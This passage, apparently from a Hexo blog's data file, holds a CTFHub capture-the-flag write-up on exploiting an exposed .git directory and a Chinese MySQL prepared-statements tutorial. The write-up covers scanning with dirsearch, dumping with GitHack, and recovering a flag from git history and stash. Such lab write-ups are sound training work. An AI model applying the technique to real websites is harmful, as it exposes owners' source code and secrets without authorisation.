log`查看日志![image-20201023024006671](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024006671.png)\n\n- 得到Flag\n\n  - 方法一：发现提交说明中有add flag，利用`git diff`来查看commits之间的不同![image-20201023024655911](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024655911.png)\n\n  - 方法二：用`git reset --hard`退回提交说明为add flag的版本![image-20201023024951095](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024951095.png)\n\n    即可将add flag版本克隆在本地文件夹中![image-20201023025225404](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025225404.png)\n\n## Stash\n\n- 知识点：[git-stash用法小结](https://www.cnblogs.com/tocy/p/git-stash-reference.html)\n- 操作同上，进入文件夹后使用`git log`![image-20201023025747482](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025747482.png)\n- `git diff`并没有flag信息![image-20201023025905370](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025905370.png)\n- `git stash list`操作，查看现有stash![image-20201023030022983](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030022983.png)\n- `git stash apply`重新应用缓存的stash![image-20201023030151666](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030151666.png)\n- `git diff`重新比对得到flag![image-20201023030323906](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030323906.png)\n\n## Index\n\n","slug":"Git泄露","published":1,"updated":"2021-07-27T03:38:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydp000lt8opawxfbexf","content":"<h1 id=\"CTFHub-Git泄露\"><a href=\"#CTFHub-Git泄露\" class=\"headerlink\" title=\"CTFHub-Git泄露\"></a>CTFHub-Git泄露</h1><p>一般思路：用dirsearch扫描发现git泄露</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023245829.png\" alt=\"image-20201023023245829\"></p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023226766.png\" alt=\"image-20201023023226766\"></p>\n<h2 id=\"Log\"><a href=\"#Log\" class=\"headerlink\" title=\"Log\"></a>Log</h2><ul>\n<li><p>知识点：详见<a href=\"https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2\" target=\"_blank\" rel=\"noopener\">Git 基础 - 查看提交历史</a>、<a href=\"https://git-scm.com/docs/git-diff\" target=\"_blank\" rel=\"noopener\">git diff</a></p>\n</li>\n<li><p>使用GitHack工具处理Git泄露情况<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023626635.png\" alt=\"image-20201023023626635\"></p>\n</li>\n<li><p>切换到爬下来的目录中用<code>git log</code>查看日志<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024006671.png\" alt=\"image-20201023024006671\"></p>\n</li>\n<li><p>得到Flag</p>\n<ul>\n<li><p>方法一：发现提交说明中有add flag，利用<code>git diff</code>来查看commits之间的不同<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024655911.png\" alt=\"image-20201023024655911\"></p>\n</li>\n<li><p>方法二：用<code>git reset --hard</code>退回提交说明为add flag的版本<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024951095.png\" alt=\"image-20201023024951095\"></p>\n<p>即可将add flag版本克隆在本地文件夹中<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025225404.png\" alt=\"image-20201023025225404\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Stash\"><a href=\"#Stash\" class=\"headerlink\" title=\"Stash\"></a>Stash</h2><ul>\n<li>知识点：<a href=\"https://www.cnblogs.com/tocy/p/git-stash-reference.html\" target=\"_blank\" rel=\"noopener\">git-stash用法小结</a></li>\n<li>操作同上，进入文件夹后使用<code>git log</code><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025747482.png\" alt=\"image-20201023025747482\"></li>\n<li><code>git diff</code>并没有flag信息<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025905370.png\" alt=\"image-20201023025905370\"></li>\n<li><code>git stash list</code>操作，查看现有stash<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030022983.png\" alt=\"image-20201023030022983\"></li>\n<li><code>git stash apply</code>重新应用缓存的stash<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030151666.png\" alt=\"image-20201023030151666\"></li>\n<li><code>git diff</code>重新比对得到flag<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030323906.png\" alt=\"image-20201023030323906\"></li>\n</ul>\n<h2 id=\"Index\"><a href=\"#Index\" class=\"headerlink\" title=\"Index\"></a>Index</h2>","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"CTFHub-Git泄露\"><a href=\"#CTFHub-Git泄露\" class=\"headerlink\" title=\"CTFHub-Git泄露\"></a>CTFHub-Git泄露</h1><p>一般思路：用dirsearch扫描发现git泄露</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023245829.png\" alt=\"image-20201023023245829\"></p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023226766.png\" alt=\"image-20201023023226766\"></p>\n<h2 id=\"Log\"><a href=\"#Log\" class=\"headerlink\" title=\"Log\"></a>Log</h2><ul>\n<li><p>知识点：详见<a href=\"https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2\" target=\"_blank\" rel=\"noopener\">Git 基础 - 查看提交历史</a>、<a href=\"https://git-scm.com/docs/git-diff\" target=\"_blank\" rel=\"noopener\">git diff</a></p>\n</li>\n<li><p>使用GitHack工具处理Git泄露情况<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023626635.png\" alt=\"image-20201023023626635\"></p>\n</li>\n<li><p>切换到爬下来的目录中用<code>git log</code>查看日志<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024006671.png\" alt=\"image-20201023024006671\"></p>\n</li>\n<li><p>得到Flag</p>\n<ul>\n<li><p>方法一：发现提交说明中有add flag，利用<code>git diff</code>来查看commits之间的不同<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024655911.png\" alt=\"image-20201023024655911\"></p>\n</li>\n<li><p>方法二：用<code>git reset --hard</code>退回提交说明为add flag的版本<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024951095.png\" alt=\"image-20201023024951095\"></p>\n<p>即可将add flag版本克隆在本地文件夹中<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025225404.png\" alt=\"image-20201023025225404\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Stash\"><a href=\"#Stash\" class=\"headerlink\" title=\"Stash\"></a>Stash</h2><ul>\n<li>知识点：<a href=\"https://www.cnblogs.com/tocy/p/git-stash-reference.html\" target=\"_blank\" rel=\"noopener\">git-stash用法小结</a></li>\n<li>操作同上，进入文件夹后使用<code>git log</code><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025747482.png\" alt=\"image-20201023025747482\"></li>\n<li><code>git diff</code>并没有flag信息<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025905370.png\" alt=\"image-20201023025905370\"></li>\n<li><code>git stash list</code>操作，查看现有stash<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030022983.png\" alt=\"image-20201023030022983\"></li>\n<li><code>git stash apply</code>重新应用缓存的stash<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030151666.png\" alt=\"image-20201023030151666\"></li>\n<li><code>git diff</code>重新比对得到flag<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030323906.png\" alt=\"image-20201023030323906\"></li>\n</ul>\n<h2 id=\"Index\"><a href=\"#Index\" class=\"headerlink\" title=\"Index\"></a>Index</h2>"},{"title":"Prepared Statements","date":"2021-09-10T06:01:10.374Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# MySQL的SQL预处理(Prepared)  \n\n学习自[MySQL的SQL预处理(Prepared)](https://www.cnblogs.com/geaozhang/p/9891338.html#a)\n\n> Prepared SQL Statement：SQL的执行、预编译处理语法、注意点\n\n[toc]\n\n## 一、SQL 语句的执行处理\n\n### 1、即时 SQL\n\n一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：\n\n1. 词法和语义解析；\n\n2. 优化 SQL 语句，制定执行计划；\n\n3. 执行并返回结果；\n\n​        如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。\n\n### 2、预处理 SQL\n\n​\t\t但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。\n​\t\t所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。\n\n​\t\t预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。\n\n**注意：**\n\n​\t\t虽然可能是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的，往往还是需要通过具体值来预估出成本代价。\n\n## 二、Prepared SQL Statement Syntax\n\n​\t\tMySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。\n　　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。\n语法：\n\n```\n# 定义预处理语句\nPREPARE stmt_name FROM preparable_stmt;\n# 执行预处理语句\nEXECUTE stmt_name [USING @var_name [, @var_name] ...];\n# 删除(释放)定义\n{DEALLOCATE | DROP} PREPARE stmt_name;\n```\n\n###  1、利用字符串定义预处理 SQL (直角三角形计算)\n\n```\nmysql> PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> SET @a = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SET @b = 4;                                                   \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> EXECUTE stmt1 USING @a, @b;\n+------------+\n| hypotenuse |\n+------------+\n|          5 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql> DEALLOCATE PREPARE stmt1;                                     \nQuery OK, 0 rows affected (0.00 sec)\n```\n\n###  2、利用变量定义预处理 SQL (直角三角形计算)\n\n```\nmysql> SET @s = 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> PREPARE stmt2 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> SET @c = 6;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SET @d = 8;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> EXECUTE stmt2 USING @c, @d;\n+------------+\n| hypotenuse |\n+------------+\n|         10 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql> DEALLOCATE PREPARE stmt2;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n###  3、解决无法传参问题\n\n　　我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 如此，就可以是用 PREPARE 语句解决此问题。\n\n```\nmysql> SET @skip = 100; SET @numrows = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SELECT * FROM t1 LIMIT @skip, @numrows;\nERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1\n\nmysql> PREPARE stmt3 FROM \"SELECT * FROM t1 LIMIT ?, ?\";\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> EXECUTE stmt3 USING @skip, @numrows;\n+-----+--------+\n| a   | filler |\n+-----+--------+\n| 100 | filler |\n| 101 | filler |\n| 102 | filler |\n+-----+--------+\n3 rows in set (0.00 sec)\n\nmysql> DEALLOCATE PREPARE stmt3;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n 　   如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时，MySQL 会把变量名当做表名，这样既不是本意，也会是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。\n\n```\nmysql> SET @table = 't2';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SET @s = CONCAT('SELECT * FROM ', @table);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> PREPARE stmt4 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> EXECUTE stmt4;\n+------+-------+-------+\n| id   | score | grade |\n+------+-------+-------+\n|    1 |    99 | A     |\n|    2 |    81 | B     |\n|    3 |    55 | D     |\n|    4 |    69 | C     |\n+------+-------+-------+\n4 rows in set (0.00 sec)\n\nmysql> DROP PREPARE stmt4;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n## 三、预处理 SQL 使用注意点\n\n1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。\n2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。\n3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。\n4、PREPARE stmt_name 的作用域是session级\n\n![img](https://gitee.com/h1ler/tuci/raw/master/null/1113510-20181101192302151-157684852.png)\n　　可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。\n\n```\nmysql> show variables like 'max_prepared%';\n+-------------------------+-------+\n| Variable_name           | Value |\n+-------------------------+-------+\n| max_prepared_stmt_count | 16382 |\n+-------------------------+-------+\n1 row in set (0.00 sec)\n```\n\n 　   预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。","source":"_posts/Prepared Statements.md","raw":"---\ntitle: Prepared Statements\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SQL注入\ncategories: SQL注入\n\n---\n\n\n\n# MySQL的SQL预处理(Prepared)  \n\n学习自[MySQL的SQL预处理(Prepared)](https://www.cnblogs.com/geaozhang/p/9891338.html#a)\n\n> Prepared SQL Statement：SQL的执行、预编译处理语法、注意点\n\n[toc]\n\n## 一、SQL 语句的执行处理\n\n### 1、即时 SQL\n\n一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：\n\n1. 词法和语义解析；\n\n2. 优化 SQL 语句，制定执行计划；\n\n3. 执行并返回结果；\n\n​        如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。\n\n### 2、预处理 SQL\n\n​\t\t但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。\n​\t\t所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。\n\n​\t\t预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。\n\n**注意：**\n\n​\t\t虽然可能是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的，往往还是需要通过具体值来预估出成本代价。\n\n## 二、Prepared SQL Statement Syntax\n\n​\t\tMySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。\n　　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。\n语法：\n\n```\n# 定义预处理语句\nPREPARE stmt_name FROM preparable_stmt;\n# 执行预处理语句\nEXECUTE stmt_name [USING @var_name [, @var_name] ...];\n# 删除(释放)定义\n{DEALLOCATE | DROP} PREPARE stmt_name;\n```\n\n###  1、利用字符串定义预处理 SQL (直角三角形计算)\n\n```\nmysql> PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> SET @a = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SET @b = 4;                                                   \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> EXECUTE stmt1 USING @a, @b;\n+------------+\n| hypotenuse |\n+------------+\n|          5 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql> DEALLOCATE PREPARE stmt1;                                     \nQuery OK, 0 rows affected (0.00 sec)\n```\n\n###  2、利用变量定义预处理 SQL (直角三角形计算)\n\n```\nmysql> SET @s = 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> PREPARE stmt2 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> SET @c = 6;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SET @d = 8;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> EXECUTE stmt2 USING @c, @d;\n+------------+\n| hypotenuse |\n+------------+\n|         10 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql> DEALLOCATE PREPARE stmt2;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n###  3、解决无法传参问题\n\n　　我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 如此，就可以是用 PREPARE 语句解决此问题。\n\n```\nmysql> SET @skip = 100; SET @numrows = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SELECT * FROM t1 LIMIT @skip, @numrows;\nERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1\n\nmysql> PREPARE stmt3 FROM \"SELECT * FROM t1 LIMIT ?, ?\";\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> EXECUTE stmt3 USING @skip, @numrows;\n+-----+--------+\n| a   | filler |\n+-----+--------+\n| 100 | filler |\n| 101 | filler |\n| 102 | filler |\n+-----+--------+\n3 rows in set (0.00 sec)\n\nmysql> DEALLOCATE PREPARE stmt3;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n 　   如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时，MySQL 会把变量名当做表名，这样既不是本意，也会是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。\n\n```\nmysql> SET @table = 't2';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> SET @s = CONCAT('SELECT * FROM ', @table);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> PREPARE stmt4 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> EXECUTE stmt4;\n+------+-------+-------+\n| id   | score | grade |\n+------+-------+-------+\n|    1 |    99 | A     |\n|    2 |    81 | B     |\n|    3 |    55 | D     |\n|    4 |    69 | C     |\n+------+-------+-------+\n4 rows in set (0.00 sec)\n\nmysql> DROP PREPARE stmt4;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n## 三、预处理 SQL 使用注意点\n\n1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。\n2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。\n3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。\n4、PREPARE stmt_name 的作用域是session级\n\n![img](https://gitee.com/h1ler/tuci/raw/master/null/1113510-20181101192302151-157684852.png)\n　　可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。\n\n```\nmysql> show variables like 'max_prepared%';\n+-------------------------+-------+\n| Variable_name           | Value |\n+-------------------------+-------+\n| max_prepared_stmt_count | 16382 |\n+-------------------------+-------+\n1 row in set (0.00 sec)\n```\n\n 　   预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。","slug":"Prepared Statements","published":1,"updated":"2021-07-27T03:36:01.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyds000ot8opdpnz4glv","content":"<h1 id=\"MySQL的SQL预处理-Prepared\"><a href=\"#MySQL的SQL预处理-Prepared\" class=\"headerlink\" title=\"MySQL的SQL预处理(Prepared)\"></a>MySQL的SQL预处理(Prepared)</h1><p>学习自<a href=\"https://www.cnblogs.com/geaozhang/p/9891338.html#a\" target=\"_blank\" rel=\"noopener\">MySQL的SQL预处理(Prepared)</a></p>\n<blockquote>\n<p>Prepared SQL Statement：SQL的执行、预编译处理语法、注意点</p>\n</blockquote>\n<p>[toc]</p>\n<h2 id=\"一、SQL-语句的执行处理\"><a href=\"#一、SQL-语句的执行处理\" class=\"headerlink\" title=\"一、SQL 语句的执行处理\"></a>一、SQL 语句的执行处理</h2><h3 id=\"1、即时-SQL\"><a href=\"#1、即时-SQL\" class=\"headerlink\" title=\"1、即时 SQL\"></a>1、即时 SQL</h3><p>一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>\n<ol>\n<li><p>词法和语义解析；</p>\n</li>\n<li><p>优化 SQL 语句，制定执行计划；</p>\n</li>\n<li><p>执行并返回结果；</p>\n</li>\n</ol>\n<p>​        如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</p>\n<h3 id=\"2、预处理-SQL\"><a href=\"#2、预处理-SQL\" class=\"headerlink\" title=\"2、预处理 SQL\"></a>2、预处理 SQL</h3><p>​        但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>​        所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。</p>\n<p>​        预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>\n<p><strong>注意：</strong></p>\n<p>​        虽然可能是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的，往往还是需要通过具体值来预估出成本代价。</p>\n<h2 id=\"二、Prepared-SQL-Statement-Syntax\"><a href=\"#二、Prepared-SQL-Statement-Syntax\" class=\"headerlink\" title=\"二、Prepared SQL Statement Syntax\"></a>二、Prepared SQL Statement Syntax</h2><p>​        MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。<br>　　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。<br>语法：</p>\n<pre><code># 定义预处理语句\nPREPARE stmt_name FROM preparable_stmt;\n# 执行预处理语句\nEXECUTE stmt_name [USING @var_name [, @var_name] ...];\n# 删除(释放)定义\n{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><h3 id=\"1、利用字符串定义预处理-SQL-直角三角形计算\"><a href=\"#1、利用字符串定义预处理-SQL-直角三角形计算\" class=\"headerlink\" title=\"1、利用字符串定义预处理 SQL (直角三角形计算)\"></a>1、利用字符串定义预处理 SQL (直角三角形计算)</h3><pre><code>mysql&gt; PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; SET @a = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SET @b = 4;                                                   \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; EXECUTE stmt1 USING @a, @b;\n+------------+\n| hypotenuse |\n+------------+\n|          5 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql&gt; DEALLOCATE PREPARE stmt1;                                     \nQuery OK, 0 rows affected (0.00 sec)</code></pre><h3 id=\"2、利用变量定义预处理-SQL-直角三角形计算\"><a href=\"#2、利用变量定义预处理-SQL-直角三角形计算\" class=\"headerlink\" title=\"2、利用变量定义预处理 SQL (直角三角形计算)\"></a>2、利用变量定义预处理 SQL (直角三角形计算)</h3><pre><code>mysql&gt; SET @s = 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; PREPARE stmt2 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; SET @c = 6;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SET @d = 8;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; EXECUTE stmt2 USING @c, @d;\n+------------+\n| hypotenuse |\n+------------+\n|         10 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql&gt; DEALLOCATE PREPARE stmt2;\nQuery OK, 0 rows affected (0.00 sec)</code></pre><h3 id=\"3、解决无法传参问题\"><a href=\"#3、解决无法传参问题\" class=\"headerlink\" title=\"3、解决无法传参问题\"></a>3、解决无法传参问题</h3><p>　　我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 如此，就可以是用 PREPARE 语句解决此问题。</p>\n<pre><code>mysql&gt; SET @skip = 100; SET @numrows = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SELECT * FROM t1 LIMIT @skip, @numrows;\nERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1\n\nmysql&gt; PREPARE stmt3 FROM \"SELECT * FROM t1 LIMIT ?, ?\";\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; EXECUTE stmt3 USING @skip, @numrows;\n+-----+--------+\n| a   | filler |\n+-----+--------+\n| 100 | filler |\n| 101 | filler |\n| 102 | filler |\n+-----+--------+\n3 rows in set (0.00 sec)\n\nmysql&gt; DEALLOCATE PREPARE stmt3;\nQuery OK, 0 rows affected (0.00 sec)</code></pre><p> 　   如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时，MySQL 会把变量名当做表名，这样既不是本意，也会是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。</p>\n<pre><code>mysql&gt; SET @table = 't2';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SET @s = CONCAT('SELECT * FROM ', @table);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; PREPARE stmt4 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; EXECUTE stmt4;\n+------+-------+-------+\n| id   | score | grade |\n+------+-------+-------+\n|    1 |    99 | A     |\n|    2 |    81 | B     |\n|    3 |    55 | D     |\n|    4 |    69 | C     |\n+------+-------+-------+\n4 rows in set (0.00 sec)\n\nmysql&gt; DROP PREPARE stmt4;\nQuery OK, 0 rows affected (0.00 sec)</code></pre><h2 id=\"三、预处理-SQL-使用注意点\"><a href=\"#三、预处理-SQL-使用注意点\" class=\"headerlink\" title=\"三、预处理 SQL 使用注意点\"></a>三、预处理 SQL 使用注意点</h2><p>1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。<br>2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。<br>3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。<br>4、PREPARE stmt_name 的作用域是session级</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/1113510-20181101192302151-157684852.png\" alt=\"img\"><br>　　可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。</p>\n<pre><code>mysql&gt; show variables like 